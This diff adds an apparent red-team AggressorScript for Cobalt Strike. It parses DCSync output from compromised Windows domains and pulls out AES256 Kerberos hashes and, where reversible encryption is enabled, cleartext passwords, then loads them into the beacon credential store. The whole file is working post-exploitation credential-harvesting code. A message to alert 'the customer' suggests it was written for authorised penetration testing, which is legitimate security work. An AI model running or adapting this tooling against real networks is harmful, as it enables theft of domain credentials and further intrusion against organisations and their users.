@@ -1,0 +1,33 @@
+# AggressorScript to load AES 256 hashes from DCsync into Cobalt Strike Credentials store
+on beacon_output {
+    if ($2 hasmatch '.*Default Salt : (\w*[A-Z]\.*\w*[A-Z])(.*)[\n\r].*Default Iterations : 4096[\n\r].*Credentials.*[\n\r].*aes256_hmac       \(4096\) : (.*)'){
+        $user = matched()[1];
+        $domain = matched()[0];
+        $aeshash = matched()[2];
+        credential_add($user,$aeshash,$domain,"dcsync",binfo($1,"internal"));
+    }
+}
+
+
+
+# Adds plain text credentials found through DCSync when the Reversible Encryption option is use in either the 
+# user's account properties or is set in Group Policy.
+on beacon_output {
+    if ("* Primary:CLEARTEXT *" isin $2){
+        $startPassword = find($2,"Primary:CLEARTEXT",0) + 24;
+        $pass = substr($2,$startPassword);
+        
+        $startUser = find($2,"SAM Username         : ",0) + strlen("SAM Username         : ");
+        $endUser = find($2,"User Principal Name  :");
+        $user = substr($2,$startUser, $endUser);
+
+        $startRealm = find($2,"User Principal Name  : ",0) + strlen("User Principal Name  : ");
+        $endRealm = find($2, "Account Type         : ");
+        $realm = substr($2,$startRealm,$endRealm);
+        $realm = split('@',$realm)[1];
+
+        credential_add($user,$pass,$realm,"PLAIN TEXT - INSECURE CONFIGURATION!", beacon_info($1,"internal"));
+
+        blog($1, "\c4\U The \"Store password using reversible encrypton\" option has been detected. Bring this to the customers attetion immediately!")
+    }
+}
